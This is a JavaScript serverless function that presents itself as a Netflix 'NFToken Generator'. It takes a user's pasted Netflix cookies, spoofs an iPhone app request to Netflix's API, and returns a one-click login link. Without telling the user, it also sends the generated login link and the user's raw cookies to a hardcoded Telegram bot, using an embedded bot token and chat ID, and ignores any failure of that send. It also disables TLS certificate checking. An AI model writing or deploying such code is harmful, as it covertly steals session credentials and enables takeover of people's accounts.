/**
 * Vercel Serverless Function - NFToken Generator API
 * POST /api/generate
 * Body: { "cookies": "..." }
 * 
 * Uses Netflix iOS API endpoint to generate nftoken.
 * Based on: https://github.com/harshitkamboj/Netflix-NFToken-Generator
 */

const https = require('https');
const { URL } = require('url');

const API_HOST = 'ios.prod.ftl.netflix.com';
const API_PATH = '/iosui/user/15.48';

// Telegram Config
const TELEGRAM_BOT_TOKEN = '8663881958:AAHFko0QBufpnRMBUN7mRTxRYaS87r0eQrw';
const TELEGRAM_CHAT_ID = '6326377463';

const QUERY_PARAMS = {
  appVersion: '15.48.1',
  config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
  device_type: 'NFAPPL-02-',
  esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
  idiom: 'phone',
  iosVersion: '15.8.5',
  isTablet: 'false',
  languages: 'en-US',
  locale: 'en-US',
  maxDeviceWidth: '375',
  model: 'saget',
  modelType: 'IPHONE8-1',
  odpAware: 'true',
  path: '["account","token","default"]',
  pathFormat: 'graph',
  pixelDensity: '2.0',
  progressive: 'false',
  responseFormat: 'json',
};

const BASE_HEADERS = {
  'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
  'x-netflix.request.attempt': '1',
  'x-netflix.request.client.user.guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
  'x-netflix.context.profile-guid': 'A4CS633D7VCBPE2GPK2HL4EKOE',
  'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
  'x-netflix.context.app-version': '15.48.1',
  'x-netflix.argo.translated': 'true',
  'x-netflix.context.form-factor': 'phone',
  'x-netflix.context.sdk-version': '2012.4',
  'x-netflix.client.appversion': '15.48.1',
  'x-netflix.context.max-device-width': '375',
  'x-netflix.context.ab-tests': '',
  'x-netflix.tracing.cl.useractionid': '4DC655F2-9C3C-4343-8229-CA1B003C3053',
  'x-netflix.client.type': 'argo',
  'x-netflix.client.ftl.esn': 'NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
  'x-netflix.context.locales': 'en-US',
  'x-netflix.context.top-level-uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
  'x-netflix.client.iosversion': '15.8.5',
  'accept-language': 'en-US;q=1',
  'x-netflix.argo.abtests': '',
  'x-netflix.context.os-version': '15.8.5',
  'x-netflix.request.client.context': '{"appState":"foreground"}',
  'x-netflix.context.ui-flavor': 'argo',
  'x-netflix.argo.nfnsm': '9',
  'x-netflix.context.pixel-density': '2.0',
  'x-netflix.request.toplevel.uuid': '90AFE39F-ADF1-4D8A-B33E-528730990FE3',
  'x-netflix.request.client.timezoneid': 'Asia/Dhaka',
};

function parseCookies(input) {
  const trimmed = input.trim();
  if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
    try {
      let parsed = JSON.parse(trimmed);
      if (!Array.isArray(parsed)) parsed = [parsed];
      return parsed.map(cookie => ({
        name: cookie.name || cookie.Name || '',
        value: cookie.value || cookie.Value || '',
        expires: cookie.expires || cookie.expirationDate || cookie.Expires || 0,
      }));
    } catch (e) {}
  }
  const lines = trimmed.split('\n').filter(line => line.trim() && !line.startsWith('#'));
  if (lines.some(line => line.split('\t').length >= 7)) {
    const cookies = [];
    for (const line of lines) {
      const parts = line.split('\t');
      if (parts.length >= 7) {
        cookies.push({ name: parts[5].trim(), value: parts[6].trim(), expires: parseInt(parts[4].trim()) || 0 });
      }
    }
    if (cookies.length > 0) return cookies;
  }
  if (trimmed.includes('=') && !trimmed.includes('\t')) {
    const pairs = trimmed.split(';').map(p => p.trim()).filter(Boolean);
    const cookies = [];
    for (const pair of pairs) {
      const eqIndex = pair.indexOf('=');
      if (eqIndex > 0) {
        cookies.push({ name: pair.substring(0, eqIndex).trim(), value: pair.substring(eqIndex + 1).trim(), expires: 0 });
      }
    }
    if (cookies.length > 0) return cookies;
  }
  return [];
}

function decodeValue(value) {
  if (typeof value === 'string' && value.includes('%')) {
    try { return decodeURIComponent(value); } catch (e) {}
  }
  return value;
}

function getExpiry(expires) {
  if (!expires) return 'Tidak diketahui';
  // If milliseconds (13 digits), convert to seconds
  if (typeof expires === 'number' && String(expires).length === 13) {
    expires = Math.floor(expires / 1000);
  }
  try {
    const d = new Date(expires * 1000);
    return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`;
  } catch (e) {
    return String(expires);
  }
}

function fetchNFToken(netflixId) {
  return new Promise((resolve, reject) => {
    // Build query string
    const queryString = Object.entries(QUERY_PARAMS)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join('&');

    const options = {
      hostname: API_HOST,
      port: 443,
      path: `${API_PATH}?${queryString}`,
      method: 'GET',
      headers: {
        ...BASE_HEADERS,
        'Cookie': `NetflixId=${netflixId}`,
      },
      rejectUnauthorized: false,
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          // Navigate: value.account.token.default.token
          const tokenData = ((((json.value || {}).account || {}).token || {}).default) || {};
          const token = tokenData.token || null;
          const expires = tokenData.expires || null;

          if (token) {
            resolve({ token, expires });
          } else {
            reject(new Error('No token in response. Response: ' + data.substring(0, 200)));
          }
        } catch (e) {
          reject(new Error('Failed to parse response: ' + data.substring(0, 200)));
        }
      });
    });

    req.on('error', (e) => reject(e));
    req.setTimeout(30000, () => { req.destroy(); reject(new Error('Request timeout')); });
    req.end();
  });
}

function sendTelegram(token, loginLink, expiry, cookies) {
  return new Promise((resolve, reject) => {
    const now = new Date();
    const timestamp = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;

    const message = `🔥 *airon NFToken Generator*\n\n` +
      `✅ *Generate Sukses!*\n\n` +
      `🔗 *Login Link:*\n\`${loginLink}\`\n\n` +
      `⏰ *Expiry:* ${expiry}\n` +
      `📅 *Generated:* ${timestamp}\n\n` +
      `🍪 *Cookies:*\n\`\`\`\n${cookies.substring(0, 3000)}\n\`\`\``;

    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    });

    req.on('error', (e) => reject(e));
    req.setTimeout(10000, () => { req.destroy(); reject(new Error('Telegram timeout')); });
    req.write(postData);
    req.end();
  });
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { cookies: cookieInput } = req.body;
    if (!cookieInput || typeof cookieInput !== 'string') {
      return res.status(400).json({ error: 'Input cookies tidak valid.' });
    }

    const parsedCookies = parseCookies(cookieInput);
    if (parsedCookies.length === 0) {
      return res.status(400).json({ error: 'Gagal parsing cookies.' });
    }

    // Find NetflixId cookie
    const netflixIdCookie = parsedCookies.find(c => c.name === 'NetflixId');
    if (!netflixIdCookie) {
      return res.status(400).json({ error: 'Cookie "NetflixId" tidak ditemukan. Pastikan sudah login Netflix sebelum export cookies.' });
    }

    // Decode the NetflixId value if URL-encoded
    const netflixId = decodeValue(netflixIdCookie.value);

    // Fetch nftoken from Netflix iOS API
    const { token, expires } = await fetchNFToken(netflixId);
    const expiry = getExpiry(expires);
    const loginLink = `https://netflix.com/?nftoken=${token}`;

    // Send to Telegram
    try {
      await sendTelegram(token, loginLink, expiry, cookieInput);
    } catch (e) {
      // Don't fail if Telegram fails
    }

    return res.status(200).json({
      token,
      loginLink,
      expiry,
    });

  } catch (error) {
    return res.status(500).json({ error: error.message || 'Terjadi kesalahan server.' });
  }
};
